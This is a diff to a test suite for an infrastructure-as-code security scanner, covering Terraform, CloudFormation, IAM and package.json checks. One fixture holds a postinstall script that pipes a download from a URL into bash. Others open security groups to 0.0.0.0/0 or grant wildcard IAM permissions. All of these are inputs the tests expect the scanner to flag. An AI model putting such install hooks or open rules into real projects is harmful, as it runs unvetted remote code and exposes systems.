@@ -1958,7 +1958,7 @@ Resources:
     assert.equal(ipv6.findings.filter((finding) => finding.ruleId === "NET001").length, 1);
   });
 
-  it("leaves unknown Fn::Sub names, Fn::Join, and Fn::FindInMap unresolved", () => {
+  it("leaves unknown Fn::Sub names and a missing Fn::FindInMap unresolved", () => {
     const region = scanIac(`AWSTemplateFormatVersion: "2010-09-09"
 Parameters:
   Cidr:
@@ -1989,7 +1989,7 @@ Resources:
           FromPort: 83
           ToPort: 83
           CidrIp:
-            Fn::Join: ["", ["0.0.0.0", "/0"]]
+            Fn::Join: ["/", ["0.0.0.0", { Ref: Missing }]]
         - IpProtocol: tcp
           FromPort: 84
           ToPort: 84
@@ -2112,7 +2112,7 @@ resource "aws_security_group" "web" {
 }
 resource "aws_security_group" "web" {
   ingress {
-    cidr_blocks = [join(",", [var.cidr])]
+    cidr_blocks = [join("/", [var.cidr, var.missing])]
   }
 }
 `,
@@ -2284,5 +2284,200 @@ Resources:
             Resource: "*"
 `);
     assert.equal(document.findings.filter((finding) => finding.ruleId === "IAM001" || finding.ruleId === "IAM002").length, 0);
+  });
+});
+
+describe("cross-file values, join, FindInMap, and package.json", () => {
+  const bundle = (files: Record<string, string>) =>
+    Object.entries(files)
+      .map(([name, text]) => `----- skaleagents-file: ${name} -----\n${text}`)
+      .join("\n");
+
+  it("shares variable defaults across files in one submission", () => {
+    const clear = scanIac(bundle({
+      "variables.tf": `variable "cidr" {\n  default = "10.0.0.0/24"\n}\n`,
+      "main.tf": `resource "aws_security_group" "web" {\n  ingress {\n    cidr_blocks = [var.cidr]\n  }\n}\n`,
+    }));
+    assert.equal(clear.findings.filter((finding) => finding.ruleId === "NET001").length, 0);
+
+    const open = scanIac(bundle({
+      "variables.tf": `variable "cidr" {\n  default = "0.0.0.0/0"\n}\n`,
+      "main.tf": `resource "aws_security_group" "web" {\n  ingress {\n    cidr_blocks = [var.cidr]\n  }\n}\n`,
+    }));
+    const exposure = open.findings.filter(
+      (finding) => finding.ruleId === "NET001" && finding.location?.path.startsWith("main.tf:"),
+    );
+    assert.equal(exposure.length, 1);
+    assert.equal(exposure[0]?.title, "Broad network exposure");
+    assert.match(exposure[0]?.detail ?? "", /Value comes from var\.cidr\./);
+    assert.equal(exposure[0]?.detail.includes("0.0.0.0/0"), false);
+
+    const direct = scanIac(`resource "aws_security_group" "web" {\n  ingress {\n    cidr_blocks = ["0.0.0.0/0"]\n  }\n}\n`);
+    assert.equal(direct.findings.find((finding) => finding.ruleId === "NET001")?.detail.includes("Value comes from"), false);
+
+    const unmarked = scanIac(`variable "cidr" {\n  default = "0.0.0.0/0"\n}\nresource "aws_security_group" "web" {\n  ingress {\n    cidr_blocks = [var.cidr]\n  }\n}\n`);
+    assert.equal(unmarked.findings.some((finding) => finding.location?.path.startsWith("main.tf:")), false);
+  });
+
+  it("resolves join and Fn::Join only when every piece is known", () => {
+    const open = scanIac(`variable "a" {\n  default = "0.0.0.0"\n}\nvariable "b" {\n  default = "0"\n}\nresource "aws_security_group" "web" {\n  ingress {\n    cidr_blocks = [join("/", [var.a, var.b])]\n  }\n}\n`);
+    const hits = open.findings.filter(
+      (finding) => finding.ruleId === "NET001" && finding.location?.path.includes("cidr_blocks"),
+    );
+    assert.equal(hits.length, 1);
+    assert.equal(hits[0]?.title, "Broad network exposure");
+
+    const clear = scanIac(`variable "a" {\n  default = "10.0.0.0"\n}\nvariable "b" {\n  default = "24"\n}\nresource "aws_security_group" "web" {\n  ingress {\n    cidr_blocks = [join("/", [var.a, var.b])]\n  }\n}\n`);
+    assert.equal(clear.findings.filter((finding) => finding.ruleId === "NET001").length, 0);
+
+    const once = scanIac(`resource "aws_security_group" "web" {\n  ingress {\n    cidr_blocks = [join("/", ["0.0.0.0", "0"])]\n  }\n}\n`);
+    assert.equal(
+      once.findings.filter((finding) => finding.ruleId === "NET001" && finding.location?.path.includes("cidr_blocks")).length,
+      1,
+    );
+
+    const joined = scanIac(`AWSTemplateFormatVersion: "2010-09-09"
+Resources:
+  Sg:
+    Type: AWS::EC2::SecurityGroup
+    Properties:
+      GroupDescription: web
+      SecurityGroupIngress:
+        - IpProtocol: tcp
+          FromPort: 80
+          ToPort: 80
+          CidrIp:
+            Fn::Join: ["/", ["0.0.0.0", "0"]]
+`);
+    const cfnHits = joined.findings.filter((finding) => finding.ruleId === "NET001");
+    assert.equal(cfnHits.length, 1);
+    assert.equal(cfnHits[0]?.detail.includes("Value comes from"), false);
+
+    const privateJoin = scanIac(`AWSTemplateFormatVersion: "2010-09-09"
+Resources:
+  Sg:
+    Type: AWS::EC2::SecurityGroup
+    Properties:
+      GroupDescription: web
+      SecurityGroupIngress:
+        - IpProtocol: tcp
+          FromPort: 80
+          ToPort: 80
+          CidrIp:
+            Fn::Join: ["/", ["10.0.0.0", "24"]]
+`);
+    assert.equal(privateJoin.findings.filter((finding) => finding.ruleId === "NET001").length, 0);
+  });
+
+  it("resolves Fn::FindInMap when the mapping entry is a literal", () => {
+    const open = scanIac(`AWSTemplateFormatVersion: "2010-09-09"
+Mappings:
+  Net:
+    Public:
+      Cidr: 0.0.0.0/0
+Resources:
+  Sg:
+    Type: AWS::EC2::SecurityGroup
+    Properties:
+      GroupDescription: web
+      SecurityGroupIngress:
+        - IpProtocol: tcp
+          FromPort: 80
+          ToPort: 80
+          CidrIp:
+            Fn::FindInMap: [Net, Public, Cidr]
+`);
+    const hits = open.findings.filter((finding) => finding.ruleId === "NET001");
+    assert.equal(hits.length, 1);
+    assert.equal(hits[0]?.title, "Broad network exposure");
+    assert.equal(hits[0]?.detail.includes("Value comes from"), false);
+
+    const clear = scanIac(bundle({
+      "mappings.yaml": `AWSTemplateFormatVersion: "2010-09-09"
+Mappings:
+  Net:
+    Private:
+      Cidr: 10.1.0.0/16
+`,
+      "main.yaml": `AWSTemplateFormatVersion: "2010-09-09"
+Resources:
+  Sg:
+    Type: AWS::EC2::SecurityGroup
+    Properties:
+      GroupDescription: web
+      SecurityGroupIngress:
+        - IpProtocol: tcp
+          FromPort: 80
+          ToPort: 80
+          CidrIp:
+            Fn::FindInMap: [Net, Private, Cidr]
+`,
+    }));
+    assert.equal(clear.findings.filter((finding) => finding.ruleId === "NET001").length, 0);
+
+    const named = scanIac(`AWSTemplateFormatVersion: "2010-09-09"
+Parameters:
+  Cidr:
+    Type: String
+    Default: 0.0.0.0/0
+Resources:
+  Sg:
+    Type: AWS::EC2::SecurityGroup
+    Properties:
+      GroupDescription: web
+      SecurityGroupIngress:
+        - IpProtocol: tcp
+          FromPort: 80
+          ToPort: 80
+          CidrIp:
+            Ref: Cidr
+`);
+    assert.match(
+      named.findings.find((finding) => finding.ruleId === "NET001")?.detail ?? "",
+      /Value comes from parameter Cidr\./,
+    );
+  });
+
+  it("checks package.json scripts and dependency ranges", () => {
+    const shell = scanIac(JSON.stringify({
+      name: "demo",
+      scripts: { postinstall: "curl https://example.com/x.sh | bash" },
+    }));
+    assert.equal(shell.format, "package");
+    const scriptHits = shell.findings.filter((finding) => finding.title === "Package script pipes a download to a shell");
+    assert.equal(scriptHits.length, 1);
+    assert.equal(scriptHits[0]?.severity, "high");
+
+    const clear = scanIac(JSON.stringify({
+      name: "demo",
+      scripts: { postinstall: "node scripts/build.js" },
+      dependencies: { left: "^1.2.3" },
+      devDependencies: { right: "~1.2.3" },
+      optionalDependencies: { pinned: "1.2.3" },
+    }));
+    assert.equal(clear.format, "package");
+    assert.equal(clear.findings.length, 0);
+
+    const floating = scanIac(JSON.stringify({
+      name: "demo",
+      dependencies: { left: "*" },
+      devDependencies: { right: "latest" },
+      optionalDependencies: { other: "^1.2.3" },
+    }));
+    const ranges = floating.findings.filter((finding) => finding.title === "Dependency range is floating");
+    assert.equal(ranges.length, 2);
+    assert.equal(ranges[0]?.severity, "medium");
+
+    const policy = scanIac(JSON.stringify({
+      Version: "2012-10-17",
+      Statement: [{ Effect: "Allow", Action: "*", Resource: "*" }],
+    }));
+    assert.equal(policy.format, "iam");
+
+    const template = scanIac(JSON.stringify({
+      AWSTemplateFormatVersion: "2010-09-09",
+      Resources: { Bucket: { Type: "AWS::S3::Bucket" } },
+    }));
+    assert.equal(template.format, "cloudformation");
   });
 });
